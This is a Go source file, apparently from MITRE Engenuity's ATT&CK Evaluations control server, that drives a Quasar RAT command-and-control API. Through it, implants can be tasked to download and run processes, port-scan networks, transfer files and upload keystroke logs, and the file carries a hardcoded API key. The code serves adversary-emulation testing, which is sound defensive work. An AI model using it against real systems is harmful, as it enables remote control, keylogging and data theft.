package quasar

import (
    "bytes"
    "encoding/json"
    "errors"
    "fmt"
    "io"
    "io/ioutil"
    "math"
    "net/http"
    "strings"
    "time"
    
    "attackevals.mitre-engenuity.org/control_server/handlers/util"
    "attackevals.mitre-engenuity.org/control_server/logger"
)

const (
    API_HOST_KEY = "api_host"
    API_PORT_KEY = "api_port"
    API_SESSIONS_ENDPOINT = "/api/beacons"
    API_TRANSFERS_ENDPOINT = "/api/transfers"
    API_UPLOADED_FILES_ENDPOINT = "/api/uploadedfiles"
    API_KEYSTROKE_UPLOAD_ENDPOINT = API_TRANSFERS_ENDPOINT + "/keylogger"
    API_TASKS_ENDPOINT = "/api/tasks"
    API_PROTOCOL_BASE = "http://"
    
    POST_CONTENT_TYPE_JSON = "application/json"
    API_KEY_HEADER = "APIKEY"
    API_KEY = "81152cc4c24d327f8fe800afbfb9777c"
    
    TRANSFER_TYPE_SERVER_TO_CLIENT = 0
    TRANSFER_TYPE_CLIENT_TO_SERVER = 1
    
    TRANSFER_STATUS_SUCCESS = 0
    TRANSFER_STATUS_ERROR = 1
    TRANSFER_STATUS_PENDING = 2
    TRANSFER_STATUS_CANCELED = 3
    TRANSFER_STATUS_PARTIAL_SUCCESS = 4
    TRANSFER_STATUS_PENDING_INCOMPLETE = 5
    
    TASK_STATUS_SUCCESS = 0
    TASK_STATUS_ERROR = 1
    TASK_STATUS_PENDING = 2
)

type QuasarFileTransferApiRequest struct {
    ClientId        string  `json:"client_id"`
    TransferType    int     `json:"type"`
    Source          string  `json:"source"`
    Dest            string  `json:"dest"`
}

type QuasarFileTransfer struct {
    Id              int     `json:"id"`
    Type            int     `json:"type"`
    Size            int     `json:"size"`
    TransferredSize int     `json:"transferred_size"`
    LocalPath       string  `json:"local_path"`
    RemotePath      string  `json:"remote_path"`
    StatusMsg       string  `json:"status_msg"`
    StatusCode      int     `json:"status"`
}

type QuasarKeyLogUploadApiRequest struct {
    ClientId    string  `json:"client_id"`
}

type QuasarKeylogUploadInfo struct {
    TaskId          string  `json:"task_id"`
    StatusCode      int     `json:"status"`
    StatusMsg       string  `json:"status_msg"`
    StatusErrMsg    string  `json:"status_err_msg"`
    TransferIds     []int   `json:"transfer_ids"`
}

type QuasarImplantTaskApiRequest struct {
    ClientId    string  `json:"client_id"`
    TaskType    int     `json:"task_type"`
    
    // Specific to process creation
    ProcPath    string  `json:"proc_path"`
    ProcArgs    string  `json:"proc_args"`
    DownloadUrl string  `json:"download_url"`
    DownloadDst string  `json:"download_dst"`
    ShellExec   bool    `json:"use_shell"`
    GetOutput   bool    `json:"get_output"`
    NoWindow    bool    `json:"no_window"`
    
    // Specific to port scans
    TargetRange string  `json:"range"`
    TargetPorts []int   `json:"ports"`
}

// Quasar server representation of implant task
type QuasarImplantTask struct {
    TaskId      string  `json:"task_id"`
    TaskType    int     `json:"task_type"`
    StatusCode  int     `json:"task_status"`
    StatusMsg   string  `json:"task_status_msg"`
    
    // Specific to process creation
    ProcPath    string  `json:"proc_path"`
    ProcArgs    string  `json:"proc_args"`
    DownloadUrl string  `json:"download_url"`
    DownloadDst string  `json:"download_dst"`
    ShellExec   bool    `json:"use_shell"`
    GetOutput   bool    `json:"get_output"`
    NoWindow    bool    `json:"no_window"`
    PID         int     `json:"pid"`
    ExitCode    int     `json:"exit_code"`
    Stdout      string  `json:"stdout"`
    Stderr      string  `json:"stderr"`
    
    // Specific to port scans
    TargetRange string           `json:"range"`
    TargetPorts []int            `json:"ports"`
    ScanResult  map[string][]int `json:"result"`
}

func PerformHttpGet(url string) ([]byte, error) {
    req, err := http.NewRequest("GET", url, nil)
    if err != nil {
        return nil, err
    }
    req.Header.Add(API_KEY_HEADER, API_KEY)
    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()
    if resp.StatusCode != http.StatusOK {
        return nil, fmt.Errorf("Expected error code 200, got %v", resp.StatusCode)
    }
    return io.ReadAll(resp.Body)
}

func PerformHttpPost(url string, contentType string, data []byte) ([]byte, error) {
    // setup HTTP POST request
    req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
    if err != nil {
        return nil, err
    }
    req.Header.Set("Content-Type", contentType)
    req.Header.Add(API_KEY_HEADER, API_KEY)

    // execute HTTP POST and read response
    client := &http.Client{}
    response, err := client.Do(req)
    if err != nil {
        return nil, err
    }
    defer response.Body.Close()
    if response.StatusCode != 200 {
        return nil, fmt.Errorf("Expected error code 200, got %v", response.StatusCode)
    }
    return ioutil.ReadAll(response.Body)
}


// Send REST API request to Quasar C2 server to fetch active sessions. Returns list of Quasar implant sessions or error.
func (q *QuasarHandler) getActiveSessions() ([]QuasarSession, error) {
    resp, err := q.httpGetResponseGetter(q.baseQuasarRestApiUrl + API_SESSIONS_ENDPOINT)
    if err != nil {
        return nil, err
    }
    var sessionList []QuasarSession
    err = json.Unmarshal(resp, &sessionList)
    if err != nil {
        return nil, err
    }
    return sessionList, nil
}

// Send REST API request to Quasar C2 server to perform a given task (non-file transfer). Returns server-provided implant task info or error
func (q *QuasarHandler) sendImplantTaskApiRequest(clientId string, evalsTask *QuasarEvalsTask) (*QuasarImplantTask, error) {
    // Create and send task API request
    taskReq := QuasarImplantTaskApiRequest{
        ClientId: clientId,
        TaskType: evalsTask.TaskType,
    }
    
    switch evalsTask.TaskType {
    case TASK_TYPE_EXEC_PROC:
        taskReq.ProcPath = evalsTask.ProcPath
        taskReq.ProcArgs = evalsTask.ProcArgs
        taskReq.DownloadUrl = evalsTask.DownloadUrl
        taskReq.DownloadDst = evalsTask.DownloadDst
        taskReq.ShellExec = evalsTask.ShellExec
        taskReq.GetOutput = evalsTask.GetOutput
        taskReq.NoWindow = evalsTask.NoWindow
    case TASK_TYPE_PORT_SCAN:
        taskReq.TargetRange = evalsTask.TargetRange
        taskReq.TargetPorts = make([]int, len(evalsTask.TargetPorts))
        copy(taskReq.TargetPorts, evalsTask.TargetPorts)
    default:
        return nil, fmt.Errorf("Unsupported task type %d", evalsTask.TaskType)
    }

    reqJsonData, err := json.Marshal(taskReq)
    if err != nil {
        return nil, fmt.Errorf("Failed to JSON marshal task request: %s", err.Error())
    } 
    
    resp, err := q.httpPostResponseGetter(q.baseQuasarRestApiUrl + API_TASKS_ENDPOINT, POST_CONTENT_TYPE_JSON, reqJsonData)
    if err != nil {
        return nil, fmt.Errorf("Failed to send POST request: %s", err.Error())
    }
    
    // Quasar server sends back the information for the created task
    return extractImplantTaskInfoStruct(resp)
}

// Wait until task completes or times out, then return final task information or error
func (q *QuasarHandler) waitForTaskCompletion(taskId string, timeout int) (*QuasarImplantTask, error) {
    // continue polling until task is no longer pending or until we hit our timeout
    pollCount := 0
    maxPollCount := getTaskPollCount(timeout)
    logger.Debug(fmt.Sprintf("[QUASAR] Waiting a maximum of %d seconds for implant task %s to complete", maxPollCount * TASK_POLLING_SLEEP, taskId))
    for pollCount < maxPollCount {
        // Get updated task info
        taskInfo, err := q.getImplantTaskInfo(taskId)
        if err != nil {
            return nil, errors.New(fmt.Sprintf("Error when getting task info for task %s: %s", taskId, err.Error()))
        }
        if taskInfo.StatusCode != TASK_STATUS_PENDING {
            return taskInfo, nil
        }
        
        pollCount += 1
        q.sleepFuncWrapper(TASK_POLLING_SLEEP * time.Second)
    }
    return nil, errors.New(fmt.Sprintf("Timed out while waiting for task %s to complete", taskId))
}

func (q *QuasarHandler) getImplantTaskInfo(taskId string) (*QuasarImplantTask, error) {
    resp, err := q.httpGetResponseGetter(fmt.Sprintf("%s%s/%s", q.baseQuasarRestApiUrl, API_TASKS_ENDPOINT, taskId))
    if err != nil {
        return nil, err
    }
    return extractImplantTaskInfoStruct(resp)
}

// Send REST API request to Quasar C2 server to perform a file transfer request. Returns server-provided file transfer info or error
func (q *QuasarHandler) sendFileTransferApiRequest(clientId string, transferType int, src string, dst string) (*QuasarFileTransfer, error) {
    // Create and send file transfer API request
    transferReq := QuasarFileTransferApiRequest{
        ClientId: clientId,
        TransferType: transferType,
        Source: src,
        Dest: dst,
    }
    reqJsonData, err := json.Marshal(transferReq)
    if err != nil {
        return nil, err
    } 
    
    resp, err := q.httpPostResponseGetter(q.baseQuasarRestApiUrl + API_TRANSFERS_ENDPOINT, POST_CONTENT_TYPE_JSON, reqJsonData)
    if err != nil {
        return nil, err
    }
    
    // Quasar server sends back the information for the created transfer
    return extractTransferStruct(resp)
}

// Send REST API request to Quasar C2 server to perform a client-to-server file transfer request. Returns server-provided file transfer info or error
func (q *QuasarHandler) sendFileUploadApiRequest(clientId string, src string, dst string) (*QuasarFileTransfer, error) {
    return q.sendFileTransferApiRequest(clientId, TRANSFER_TYPE_CLIENT_TO_SERVER, src, dst)
}

// Send REST API request to Quasar C2 server to perform a server-to-client file transfer request. Returns server-provided file transfer info or error
func (q *QuasarHandler) sendFileDownloadApiRequest(clientId string, src string, dst string) (*QuasarFileTransfer, error) {
    return q.sendFileTransferApiRequest(clientId, TRANSFER_TYPE_SERVER_TO_CLIENT, src, dst)
}

// Wait until file transfer completes or times out, then return final transfer information or error
func (q *QuasarHandler) waitForTransferCompletion(transferId int, timeout int) (*QuasarFileTransfer, error) {
    // continue polling until transfer is no longer pending or until we hit our timeout
    pollCount := 0
    maxPollCount := getTaskPollCount(timeout)
    logger.Debug(fmt.Sprintf("[QUASAR] Waiting a maximum of %d seconds for file transfer %d to complete", maxPollCount * TASK_POLLING_SLEEP, transferId))
    for pollCount < maxPollCount {
        // Get updated transfer info
        transfer, err := q.getFileTransferInfo(transferId)
        if err != nil {
            return nil, errors.New(fmt.Sprintf("Error when getting file transfer info for transfer %d: %s", transferId, err.Error()))
        }
        if transfer.StatusCode != TRANSFER_STATUS_PENDING {
            return transfer, nil
        }
        
        pollCount += 1
        q.sleepFuncWrapper(TASK_POLLING_SLEEP * time.Second)
    }
    return nil, errors.New(fmt.Sprintf("Timed out while waiting for file transfer %d to complete", transferId))
}

func (q *QuasarHandler) getFileTransferInfo(transferId int) (*QuasarFileTransfer, error) {
    resp, err := q.httpGetResponseGetter(fmt.Sprintf("%s%s/%d", q.baseQuasarRestApiUrl, API_TRANSFERS_ENDPOINT, transferId))
    if err != nil {
        return nil, err
    }
    return extractTransferStruct(resp)
}

func (q *QuasarHandler) fetchAndForwardUploadedFile(transferId int, fileName string) (string, error) {
    fileData, err := q.httpGetResponseGetter(fmt.Sprintf("%s%s/%d", q.baseQuasarRestApiUrl, API_UPLOADED_FILES_ENDPOINT, transferId))
    if err != nil {
        return "", errors.New(fmt.Sprintf("Failed to get uploaded file for transfer ID %d: %s", transferId, err.Error()))
    }
    
    // forward to REST API server
    url := "http://" + q.restAPIaddress + "/api/v1.0/upload/" + fileName
    resp, err := http.Post(url, "application/octet-stream", bytes.NewBuffer(fileData))
    if err != nil {
        return "", errors.New(fmt.Sprintf("Failed to forward uploaded file %s to evals C2 REST API server: %s", fileName, err.Error()))
    }
    defer resp.Body.Close()
    return util.ExtractRestApiStringResponsedData(resp)
}

func (q *QuasarHandler) sendKeylogUploadTaskApiRequest(clientId string) (*QuasarKeylogUploadInfo, error) {
    // Create and send keystroke log upload API request
    transferReq := QuasarKeyLogUploadApiRequest{
        ClientId: clientId,
    }
    reqJsonData, err := json.Marshal(transferReq)
    if err != nil {
        return nil, err
    } 
    
    resp, err := q.httpPostResponseGetter(q.baseQuasarRestApiUrl + API_KEYSTROKE_UPLOAD_ENDPOINT, POST_CONTENT_TYPE_JSON, reqJsonData)
    if err != nil {
        return nil, err
    }
    
    // Quasar server sends back the information for the created transfer
    return extractKeystrokeUploadStruct(resp)
}

func (q *QuasarHandler) getKeystrokeUploadInfo(taskId string) (*QuasarKeylogUploadInfo, error)  {
    resp, err := q.httpGetResponseGetter(fmt.Sprintf("%s%s/%s", q.baseQuasarRestApiUrl, API_KEYSTROKE_UPLOAD_ENDPOINT, taskId))
    if err != nil {
        return nil, err
    }
    return extractKeystrokeUploadStruct(resp)
}

func (q *QuasarHandler) waitForKeystrokeUploadCompletion(taskId string, timeout int) (*QuasarKeylogUploadInfo, error) {
    // continue polling until upload is no longer pending or until we hit our timeout
    pollCount := 0
    maxPollCount := getTaskPollCount(timeout)
    logger.Debug(fmt.Sprintf("[QUASAR] Waiting a maximum of %d seconds for keystroke upload task %s to complete", maxPollCount * TASK_POLLING_SLEEP, taskId))
    for pollCount < maxPollCount {
        // Get updated upload info
        uploadInfo, err := q.getKeystrokeUploadInfo(taskId)
        if err != nil {
            return nil, errors.New(fmt.Sprintf("Error when getting keystroke log upload info for task ID %s: %s", taskId, err.Error()))
        }
        if uploadInfo.StatusCode != TRANSFER_STATUS_PENDING && uploadInfo.StatusCode != TRANSFER_STATUS_PENDING_INCOMPLETE {
            return uploadInfo, nil
        }
        
        pollCount += 1
        q.sleepFuncWrapper(TASK_POLLING_SLEEP * time.Second)
    }
    return nil, errors.New(fmt.Sprintf("Timed out while waiting for keystroke log upload task %s to complete", taskId))
}

func (q *QuasarHandler) fetchAndForwardUploadedKeystrokeLogs(sessionId string, transferIds []int) (string, error) {
    if len(transferIds) == 0 {
        return "No keystroke logs uploaded. Nothing to forward.", nil
    }
    errMsg := ""
    finalResp := ""
    for _, transferId := range(transferIds) {
        // double check that the transfer was indeed finished and get the base name
        transferInfo, err := q.getFileTransferInfo(transferId)
        if err != nil {
            errMsg += err.Error() + "\n"
            continue
        }
        if transferInfo.StatusCode != TRANSFER_STATUS_SUCCESS {
            errMsg += fmt.Sprintf("Keystroke log upload transfer ID %d not actually complete - cannot fetch uploaded file.\n", transferId)
            continue
        }
        filepath := fmt.Sprintf("%s_%s", sessionId, getUploadedFileName(transferInfo.LocalPath))
        finalResp += fmt.Sprintf("Saving keystroke log upload from transfer ID %d to %s\n", transferId, filepath)
        resp, err := q.fetchAndForwardUploadedFile(transferId, filepath)
        if err != nil {
            errMsg += err.Error() + "\n"
        } else {
            finalResp += resp + "\n"
        }
    }
    
    if len(errMsg) > 0 {
        return finalResp, errors.New(errMsg)
    }
    return finalResp, nil
}

func extractKeystrokeUploadStruct(data []byte) (*QuasarKeylogUploadInfo, error) {
    uploadInfo := new(QuasarKeylogUploadInfo)
    err := json.Unmarshal(data, uploadInfo)
    if err != nil {
        return nil, err
    }
    
    return uploadInfo, nil
}

func extractTransferStruct(data []byte) (*QuasarFileTransfer, error) {
    transfer := new(QuasarFileTransfer)
    err := json.Unmarshal(data, transfer)
    if err != nil {
        return nil, err
    }
    
    return transfer, nil
}

func extractImplantTaskInfoStruct(data []byte) (*QuasarImplantTask, error) {
    taskInfo := new(QuasarImplantTask)
    err := json.Unmarshal(data, taskInfo)
    if err != nil {
        return nil, err
    }
    
    return taskInfo, nil
}

func getUploadedFileName(filepath string) string {
    index := strings.LastIndex(filepath, "\\")
    if index < 0 {
        return filepath
    }
    return filepath[index+1:]
}

func getTaskPollCount(timeout int) int {
    if timeout <= 0 {
        return DEFAULT_MAX_TASK_POLLING_COUNT
    }
    return int(math.Ceil(float64(timeout) / float64(TASK_POLLING_SLEEP)))
}

